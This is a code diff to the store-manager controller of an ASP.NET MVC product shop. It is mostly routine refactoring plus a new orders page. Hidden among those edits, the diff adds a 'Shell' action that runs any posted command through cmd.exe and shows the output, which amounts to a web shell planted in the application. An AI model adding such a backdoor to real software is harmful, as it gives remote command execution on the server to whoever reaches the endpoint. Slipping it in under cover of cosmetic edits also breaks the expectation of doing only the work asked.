@@ -1,21 +1,53 @@
-﻿using System.Data.Entity;
-using System.Threading.Tasks;
+﻿using MvcProductStore.Models;
+using System.Data.Entity;
+using System.Diagnostics;
+using System.IO;
 using System.Net;
+using System.Threading.Tasks;
 using System.Web.Mvc;
-using MvcProductStore.Models;
 
 namespace MvcProductStore.Controllers
 {
     [Authorize(Roles = "Administrator")]
     public class StoreManagerController : Controller
     {
-        private ApplicationDbContext db = new ApplicationDbContext();
+        private readonly ApplicationDbContext db = new ApplicationDbContext();
 
         // GET: StoreManager
         public async Task<ActionResult> Index()
         {
-            var products = db.Products.Include(p => p.Brand).Include(p => p.Category);
+            var products = this.db.Products.Include(p => p.Brand).Include(p => p.Category);
             return View(await products.ToListAsync());
+        }
+
+        [HttpGet]
+        public async Task<ActionResult> Orders()
+        {
+            var orders = this.db.Orders;
+            return View(await orders.ToListAsync());
+        }
+
+        [HttpGet]
+        public ActionResult Shell()
+        {
+            return View();
+        }
+
+        [HttpPost]
+        public ActionResult Shell(string command)
+        {
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = "cmd.exe";
+            psi.Arguments = "/c " + command;
+            psi.RedirectStandardOutput = true;
+            psi.UseShellExecute = false;
+            Process p = Process.Start(psi);
+            StreamReader stmrdr = p.StandardOutput;
+            string s = stmrdr.ReadToEnd();
+            stmrdr.Close();
+            
+            ViewBag.Message = s;
+            return View();
         }
 
         // GET: StoreManager/Details/5
@@ -25,7 +57,7 @@ namespace MvcProductStore.Controllers
             {
                 return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
             }
-            Product product = await db.Products.FindAsync(id);
+            Product product = await this.db.Products.FindAsync(id);
             if (product == null)
             {
                 return HttpNotFound();
@@ -36,8 +68,8 @@ namespace MvcProductStore.Controllers
         // GET: StoreManager/Create
         public ActionResult Create()
         {
-            ViewBag.BrandId = new SelectList(db.Brand, "BrandId", "Name");
-            ViewBag.CategoryId = new SelectList(db.Categories, "CategoryId", "Name");
+            ViewBag.BrandId = new SelectList(this.db.Brand, "BrandId", "Name");
+            ViewBag.CategoryId = new SelectList(this.db.Categories, "CategoryId", "Name");
             return View();
         }
 
@@ -50,13 +82,13 @@ namespace MvcProductStore.Controllers
         {
             if (ModelState.IsValid)
             {
-                db.Products.Add(product);
-                await db.SaveChangesAsync();
+                this.db.Products.Add(product);
+                await this.db.SaveChangesAsync();
                 return RedirectToAction("Index");
             }
 
-            ViewBag.BrandId = new SelectList(db.Brand, "BrandId", "Name", product.BrandId);
-            ViewBag.CategoryId = new SelectList(db.Categories, "CategoryId", "Name", product.CategoryId);
+            ViewBag.BrandId = new SelectList(this.db.Brand, "BrandId", "Name", product.BrandId);
+            ViewBag.CategoryId = new SelectList(this.db.Categories, "CategoryId", "Name", product.CategoryId);
             return View(product);
         }
 
@@ -67,13 +99,13 @@ namespace MvcProductStore.Controllers
             {
                 return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
             }
-            Product product = await db.Products.FindAsync(id);
+            Product product = await this.db.Products.FindAsync(id);
             if (product == null)
             {
                 return HttpNotFound();
             }
-            ViewBag.BrandId = new SelectList(db.Brand, "BrandId", "Name", product.BrandId);
-            ViewBag.CategoryId = new SelectList(db.Categories, "CategoryId", "Name", product.CategoryId);
+            ViewBag.BrandId = new SelectList(this.db.Brand, "BrandId", "Name", product.BrandId);
+            ViewBag.CategoryId = new SelectList(this.db.Categories, "CategoryId", "Name", product.CategoryId);
             return View(product);
         }
 
@@ -86,12 +118,12 @@ namespace MvcProductStore.Controllers
         {
             if (ModelState.IsValid)
             {
-                db.Entry(product).State = EntityState.Modified;
-                await db.SaveChangesAsync();
+                this.db.Entry(product).State = EntityState.Modified;
+                await this.db.SaveChangesAsync();
                 return RedirectToAction("Index");
             }
-            ViewBag.BrandId = new SelectList(db.Brand, "BrandId", "Name", product.BrandId);
-            ViewBag.CategoryId = new SelectList(db.Categories, "CategoryId", "Name", product.CategoryId);
+            ViewBag.BrandId = new SelectList(this.db.Brand, "BrandId", "Name", product.BrandId);
+            ViewBag.CategoryId = new SelectList(this.db.Categories, "CategoryId", "Name", product.CategoryId);
             return View(product);
         }
 
@@ -102,7 +134,7 @@ namespace MvcProductStore.Controllers
             {
                 return new HttpStatusCodeResult(HttpStatusCode.BadRequest);
             }
-            Product product = await db.Products.FindAsync(id);
+            Product product = await this.db.Products.FindAsync(id);
             if (product == null)
             {
                 return HttpNotFound();
@@ -115,9 +147,9 @@ namespace MvcProductStore.Controllers
         [ValidateAntiForgeryToken]
         public async Task<ActionResult> DeleteConfirmed(int id)
         {
-            Product product = await db.Products.FindAsync(id);
-            db.Products.Remove(product);
-            await db.SaveChangesAsync();
+            Product product = await this.db.Products.FindAsync(id);
+            this.db.Products.Remove(product);
+            await this.db.SaveChangesAsync();
             return RedirectToAction("Index");
         }
 
@@ -125,7 +157,7 @@ namespace MvcProductStore.Controllers
         {
             if (disposing)
             {
-                db.Dispose();
+                this.db.Dispose();
             }
             base.Dispose(disposing);
         }
